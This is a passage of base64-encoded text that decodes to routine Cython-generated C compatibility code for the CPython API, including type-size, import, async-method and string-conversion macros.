ShvKQogICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfR0VUX1NJWkUobykKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKG8pIFB5VW5pY29kZV9HRVRfTEVOR1RIKG8pCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKG8pIFB5VHVwbGVfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9TSVpFKG8pIFB5TGlzdF9TaXplKG8pCiAgI2RlZmluZSBfX1B5eF9QeVNldF9HRVRfU0laRShvKSBQeVNldF9TaXplKG8pCiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0dFVF9TSVpFKG8pIFB5Qnl0ZXNfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfU2l6ZShvKQogICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgobykgUHlVbmljb2RlX0dldExlbmd0aChvKQojZW5kaWYKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICNkZWZpbmUgX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKG5hbWUpIFB5SW1wb3J0X0FkZE1vZHVsZVJlZihuYW1lKQojZWxzZQogIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoY29uc3QgY2hhciAqbmFtZSkgewogICAgICBQeU9iamVjdCAqbW9kdWxlID0gUHlJbXBvcnRfQWRkTW9kdWxlKG5hbWUpOwogICAgICBQeV9YSU5DUkVGKG1vZHVsZSk7CiAgICAgIHJldHVybiBtb2R1bGU7CiAgfQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAhZGVmaW5lZChQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZykKICAjZGVmaW5lIFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKHMpIFB5VW5pY29kZV9Gcm9tU3RyaW5nKHMpCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5TG9uZ19Gcm9tSGFzaF90IFB5TG9uZ19Gcm9tU3NpemVfdAojZGVmaW5lIF9fUHl4X1B5TG9uZ19Bc0hhc2hfdCAgIF9fUHl4X1B5SW5kZXhfQXNTc2l6ZV90CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKICAgICNkZWZpbmUgX19QeXhfUHlTZW5kUmVzdWx0IFB5U2VuZFJlc3VsdAojZWxzZQogICAgdHlwZWRlZiBlbnVtIHsKICAgICAgICBQWUdFTl9SRVRVUk4gPSAwLAogICAgICAgIFBZR0VOX0VSUk9SID0gLTEsCiAgICAgICAgUFlHRU5fTkVYVCA9IDEsCiAgICB9IF9fUHl4X1B5U2VuZFJlc3VsdDsKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBBMwogIHR5cGVkZWYgX19QeXhfUHlTZW5kUmVzdWx0ICgqX19QeXhfcHlpdGVyX3NlbmRmdW5jKShQeU9iamVjdCAqaXRlciwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJlc3VsdCk7CiNlbHNlCiAgI2RlZmluZSBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgc2VuZGZ1bmMKI2VuZGlmCiNpZiAhQ1lUSE9OX1VTRV9BTV9TRU5ECiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMAojZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDAKI2RlZmluZSBfX1BZWF9IQVNfUFlfQU1fU0VORCAxCiNlbHNlCiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMiAgLy8gb3VyIG93biBiYWNrcG9ydGVkIGltcGxlbWVudGF0aW9uCiNlbmRpZgojaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPCAyCiAgICAjZGVmaW5lIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0IFB5QXN5bmNNZXRob2RzCiNlbHNlCiAgICB0eXBlZGVmIHN0cnVjdCB7CiAgICAgICAgdW5hcnlmdW5jIGFtX2F3YWl0OwogICAgICAgIHVuYXJ5ZnVuYyBhbV9haXRlcjsKICAgICAgICB1bmFyeWZ1bmMgYW1fYW5leHQ7CiAgICAgICAgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGFtX3NlbmQ7CiAgICB9IF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0OwogICAgI2RlZmluZSBfX1B5eF9TbG90VHBBc0FzeW5jKHMpICgoUHlBc3luY01ldGhvZHMqKShzKSkKI2VuZGlmCiNpZiBDWVRIT05fVVNFX0FNX1NFTkQgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEYwCiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgxVUwgPDwgMjEpCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgwKQojZW5kaWYKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKI2RlZmluZSBfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkgUHlJbnRlcnByZXRlclN0YXRlX0dldCgpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpIFB5VGhyZWFkU3RhdGVfR2V0KCktPmludGVycAojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiNpZmRlZiBfX2NwbHVzcGx1cwpleHRlcm4gIkMiCiNlbmRpZgpQeUFQSV9GVU5DKHZvaWQgKikgUHlNZW1fQ2FsbG9jKHNpemVfdCBuZWxlbSwgc2l6ZV90IGVsc2l6ZSk7CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgaW50IF9fUHl4X2luaXRfY29fdmFyaWFibGUoUHlPYmplY3QgKmluc3BlY3QsIGNvbnN0IGNoYXIqIG5hbWUsIGludCAqd3JpdGVfdG8pIHsKICAgIGludCB2YWx1ZTsKICAgIFB5T2JqZWN0ICpweV92YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoaW5zcGVjdCwgbmFtZSk7CiAgICBpZiAoIXB5X3ZhbHVlKSByZXR1cm4gMDsKICAgIHZhbHVlID0gKGludCkgUHlMb25nX0FzTG9uZyhweV92YWx1ZSk7CiAgICBQeV9ERUNSRUYocHlfdmFsdWUpOwogICAgKndyaXRlX3RvID0gdmFsdWU7CiAgICByZXR1cm4gdmFsdWUgIT0gLTEgfHwgIVB5RXJyX09jY3VycmVkKCk7Cn0Kc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKSB7CiAgICBQeU9iamVjdCAqaW5zcGVjdDsKICAgIGludCByZXN1bHQ7CiAgICBpbnNwZWN0ID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJpbnNwZWN0Iik7CiAgICByZXN1bHQgPQojaWYgIWRlZmluZWQoQ09fT1BUSU1JWkVEKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX09QVElNSVpFRCIsICZDT19PUFRJTUlaRUQpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fTkVXTE9DQUxTKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX05FV0xPQ0FMUyIsICZDT19ORVdMT0NBTFMpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fVkFSQVJHUykKICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19WQVJBUkdTIiwgJkNPX1ZBUkFSR1MpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fVkFSS0VZV09SRFMpCiAgICAgICAgX19QeXhfaW5pdF9jb192YXJpYWJsZShpbnNwZWN0LCAiQ09fVkFSS0VZV09SRFMiLCAmQ09fVkFSS0VZV09SRFMpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fQVNZTkNfR0VORVJBVE9SKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0FTWU5DX0dFTkVSQVRPUiIsICZDT19BU1lOQ19HRU5FUkFUT1IpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fR0VORVJBVE9SKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0dFTkVSQVRPUiIsICZDT19HRU5FUkFUT1IpICYmCiNlbmRpZgojaWYgIWRlZmluZWQoQ09fQ09ST1VUSU5FKQogICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0NPUk9VVElORSIsICZDT19DT1JPVVRJTkUpICYmCiNlbmRpZgogICAgICAgIDE7CiAgICBQeV9ERUNSRUYoaW5zcGVjdCk7CiAgICByZXR1cm4gcmVzdWx0ID8gMCA6IC0xOwp9CiNlbHNlCnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCkgewogICAgcmV0dXJuIDA7ICAvLyBJdCdzIGEgbGltaXRlZCBBUEktb25seSBmZWF0dXJlCn0KI2VuZGlmCgoKI2lmIGRlZmluZWQoX1dJTjMyKSB8fCBkZWZpbmVkKFdJTjMyKSB8fCBkZWZpbmVkKE1TX1dJTkRPV1MpCiAgI2lmbmRlZiBfVVNFX01BVEhfREVGSU5FUwogICAgI2RlZmluZSBfVVNFX01BVEhfREVGSU5FUwogICNlbmRpZgojZW5kaWYKI2luY2x1ZGUgPG1hdGguaD4KI2lmZGVmIE5BTgojZGVmaW5lIF9fUFlYX05BTigpICgoZmxvYXQpIE5BTikKI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgZmxvYXQgX19QWVhfTkFOKCkgewogIGZsb2F0IHZhbHVlOwogIG1lbXNldCgmdmFsdWUsIDB4RkYsIHNpemVvZih2YWx1ZSkpOwogIHJldHVybiB2YWx1ZTsKfQojZW5kaWYKI2lmIGRlZmluZWQoX19DWUdXSU5fXykgJiYgZGVmaW5lZChfTERCTF9FUV9EQkwpCiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jCiNlbHNlCiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jbAojZW5kaWYKCiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FCiNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FIDAKI2VuZGlmCiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwojZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FCiNlbmRpZgojaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwojZGVmaW5lIF9fUFlYX01BUktfRVJSX1BPUyhmX2luZGV4LCBsaW5lbm8pICB7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfZltmX2luZGV4XTsgKHZvaWQpIF9fcHl4X2ZpbGVuYW1lOyBfX3B5eF9saW5lbm8gPSBsaW5lbm87ICh2b2lkKSBfX3B5eF9saW5lbm87IF9fcHl4X2NsaW5lbm8gPSBfX0xJTkVfXzsgKHZvaWQpIF9fcHl4X2NsaW5lbm87IH0KI2Vsc2UKI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyAodm9pZCkgX19weXhfY2xpbmVubzsgfQojZW5kaWYKI2RlZmluZSBfX1BZWF9FUlIoZl9pbmRleCwgbGluZW5vLCBMbl9lcnJvcikgXAogICAgeyBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSBnb3RvIExuX2Vycm9yOyB9CgojaWZkZWYgQ1lUSE9OX0VYVEVSTl9DCiAgICAjdW5kZWYgX19QWVhfRVhURVJOX0MKICAgICNkZWZpbmUgX19QWVhfRVhURVJOX0MgQ1lUSE9OX0VYVEVSTl9DCiNlbGlmIGRlZmluZWQoX19QWVhfRVhURVJOX0MpCiAgICAjaWZkZWYgX01TQ19WRVIKICAgICNwcmFnbWEgbWVzc2FnZSAoIlBsZWFzZSBkbyBub3QgZGVmaW5lIHRoZSAnX19QWVhfRVhURVJOX0MnIG1hY3JvIGV4dGVybmFsbHkuIFVzZSAnQ1lUSE9OX0VYVEVSTl9DJyBpbnN0ZWFkLiIpCiAgICAjZWxzZQogICAgI3dhcm5pbmcgUGxlYXNlIGRvIG5vdCBkZWZpbmUgdGhlICdfX1BZWF9FWFRFUk5fQycgbWFjcm8gZXh0ZXJuYWxseS4gVXNlICdDWVRIT05fRVhURVJOX0MnIGluc3RlYWQuCiAgICAjZW5kaWYKI2Vsc2UKICAjaWZkZWYgX19jcGx1c3BsdXMKICAgICNkZWZpbmUgX19QWVhfRVhURVJOX0MgZXh0ZXJuICJDIgogICNlbHNlCiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVybgogICNlbmRpZgojZW5kaWYKCiNkZWZpbmUgX19QWVhfSEFWRV9fbmUKI2RlZmluZSBfX1BZWF9IQVZFX0FQSV9fbmUKCiNpZmRlZiBfT1BFTk1QCiNpbmNsdWRlIDxvbXAuaD4KI2VuZGlmIAoKI2lmIGRlZmluZWQoUFlSRVhfV0lUSE9VVF9BU1NFUlRJT05TKSAmJiAhZGVmaW5lZChDWVRIT05fV0lUSE9VVF9BU1NFUlRJT05TKQojZGVmaW5lIENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlMKI2VuZGlmCgojZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIDAKI2RlZmluZSBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4IDAKI2RlZmluZSBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElORyAiIgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbVN0cmluZ0FuZFNpemUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZQojZGVmaW5lIF9fUHl4X3VjaGFyX2Nhc3QoYykgKCh1bnNpZ25lZCBjaGFyKWMpCiNkZWZpbmUgX19QeXhfbG9uZ19jYXN0KHgpICgobG9uZyl4KQojZGVmaW5lIF9fUHl4X2ZpdHNfUHlfc3NpemVfdCh2LCB0eXBlLCBpc19zaWduZWQpICAoXAogICAgKHNpemVvZih0eXBlKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgIHx8XAogICAgKHNpemVvZih0eXBlKSA+IHNpemVvZihQeV9zc2l6ZV90KSAmJlwKICAgICAgICAgIGxpa2VseSh2IDwgKHR5cGUpUFlfU1NJWkVfVF9NQVggfHxcCiAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkgICYmXAogICAgICAgICAgKCFpc19zaWduZWQgfHwgbGlrZWx5KHYgPiAodHlwZSlQWV9TU0laRV9UX01JTiB8fFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2ID09ICh0eXBlKVBZX1NTSVpFX1RfTUlOKSkpICB8fFwKICAgIChzaXplb2YodHlwZSkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpICYmXAogICAgICAgICAgKGlzX3NpZ25lZCB8fCBsaWtlbHkodiA8ICh0eXBlKVBZX1NTSVpFX1RfTUFYIHx8XAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkpKSAgKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfaXNfdmFsaWRfaW5kZXgoUHlfc3NpemVfdCBpLCBQeV9zc2l6ZV90IGxpbWl0KSB7CiAgICByZXR1cm4gKHNpemVfdCkgaSA8IChzaXplX3QpIGxpbWl0Owp9CiNpZiBkZWZpbmVkIChfX2NwbHVzcGx1cykgJiYgX19jcGx1c3BsdXMgPj0gMjAxMTAzTAogICAgI2luY2x1ZGUgPGNzdGRsaWI+CiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIHN0ZDo6YWJzKHZhbHVlKQojZWxpZiBTSVpFT0ZfSU5UID49IFNJWkVPRl9TSVpFX1QKICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgYWJzKHZhbHVlKQojZWxpZiBTSVpFT0ZfTE9ORyA+PSBTSVpFT0ZfU0laRV9UCiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxhYnModmFsdWUpCiNlbGlmIGRlZmluZWQgKF9NU0NfVkVSKQogICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSAoKFB5X3NzaXplX3QpX2FiczY0KHZhbHVlKSkKI2VsaWYgZGVmaW5lZCAoX19TVERDX1ZFUlNJT05fXykgJiYgX19TVERDX1ZFUlNJT05fXyA+PSAxOTk5MDFMCiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGxsYWJzKHZhbHVlKQojZWxpZiBkZWZpbmVkIChfX0dOVUNfXykKICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgX19idWlsdGluX2xsYWJzKHZhbHVlKQojZWxzZQogICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSAoKHZhbHVlPDApID8gLXZhbHVlIDogdmFsdWUpCiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X3NzaXplX3N0cmxlbihjb25zdCBjaGFyICpzKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmcoUHlPYmplY3QqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiwgUHlfc3NpemVfdCogbGVuZ3RoKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciopOwojZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmdBbmRTaXplKHMsIGwpIFB5Qnl0ZUFycmF5X0Zyb21TdHJpbmdBbmRTaXplKChjb25zdCBjaGFyKilzLCBsKQojZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZyAgICAgICAgUHlCeXRlc19Gcm9tU3RyaW5nCiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKik7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVNTdHJpbmcocykgICAgKChzaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1NTdHJpbmcocykgICAgKChjb25zdCBzaWduZWQgY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzVVN0cmluZyhzKSAgICAoKGNvbnN0IHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQVNfU1RSSU5HKHMpCiNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVN0cmluZyhzKSAgICAgKChjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlU1N0cmluZyhzKSAgICAoKHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlVVN0cmluZyhzKSAgICAoKHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU3RyaW5nKHMpICAgICAoKGNvbnN0IGNoYXIqKSBQeUJ5dGVzX0FzU3RyaW5nKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfQXNTdHJpbmcocykgUHlCeXRlQXJyYXlfQXNTdHJpbmcocykKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNXcml0YWJsZVN0cmluZyhzKSAgICAoKGNoYXIqKShfX3B5eF91aW50cHRyX3QpIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVTU3RyaW5nKHMpICAgICgoc2lnbmVkIGNoYXIqKShfX3B5eF91aW50cHRyX3QpIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVVU3RyaW5nKHMpICAgICgodW5zaWduZWQgY2hhciopKF9fcHl4X3VpbnRwdHJfdCkgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbUNTdHJpbmcocykgIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpCiNkZWZpbmUgX19QeXhfUHlCeXRlc19Gcm9tQ1N0cmluZyhzKSAgIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZygoY29uc3QgY2hhciopcykKI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tQ1N0cmluZyhzKSAgIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoKGNvbnN0IGNoYXIqKXMpCiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zyb21DU3RyaW5nKHMpIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tT3JkaW5hbChvKSAgICAgICBQeVVuaWNvZGVfRnJvbU9yZGluYWwoKGludClvKQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Bc1VuaWNvZGUgICAgICAgICAgICBQeVVuaWNvZGVfQXNVbmljb2RlCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9OZXdSZWYoUHlPYmplY3QgKm9iaikgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwYTAwMDAgfHwgZGVmaW5lZChQeV9OZXdSZWYpCiAgICByZXR1cm4gUHlfTmV3UmVmKG9iaik7CiNlbHNlCiAgICBQeV9JTkNSRUYob2JqKTsKICAgIHJldHVybiBvYmo7CiNlbmRpZgp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9YTmV3UmVmKFB5T2JqZWN0ICpvYmopIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfWE5ld1JlZikKICAgIHJldHVybiBQeV9YTmV3UmVmKG9iaik7CiNlbHNlCiAgICBQeV9YSU5DUkVGKG9iaik7CiAgICByZXR1cm4gb2JqOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfT3duZWRfUHlfTm9uZShpbnQgYik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlCb29sX0Zyb21Mb25nKGxvbmcgYik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWUoUHlPYmplY3QqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZUFuZERlY3JlZihQeU9iamVjdCopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZyhQeU9iamVjdCogeCk7CiNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9UdXBsZShvYmopXAogICAgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qob2JqKSkgPyBfX1B5eF9OZXdSZWYob2JqKSA6IFB5U2VxdWVuY2VfVHVwbGUob2JqKSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9QeUluZGV4X0FzU3NpemVfdChQeU9iamVjdCopOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X2hhc2hfdCBfX1B5eF9QeUluZGV4X0FzSGFzaF90KFB5T2JqZWN0Kik7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSAoUHlGbG9hdF9DaGVja0V4YWN0KHgpID8gUHlGbG9hdF9BU19ET1VCTEUoeCkgOiBQeUZsb2F0X0FzRG91YmxlKHgpKQojZGVmaW5lIF9fUHl4X1B5RmxvYXRfQVNfRE9VQkxFKHgpIFB5RmxvYXRfQVNfRE9VQkxFKHgpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSBQeUZsb2F0X0FzRG91YmxlKHgpCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoeCkgUHlGbG9hdF9Bc0RvdWJsZSh4KQojZW5kaWYKI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FzRmxvYXQoeCkgKChmbG9hdCkgX19QeXhfUHlGbG9hdF9Bc0RvdWJsZSh4KSkKI2RlZmluZSBfX1B5eF9QeU51bWJlcl9JbnQoeCkgKFB5TG9uZ19DaGVja0V4YWN0KHgpID8gX19QeXhfTmV3UmVmKHgpIDogUHlOdW1iZXJfTG9uZyh4KSkKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMEE3C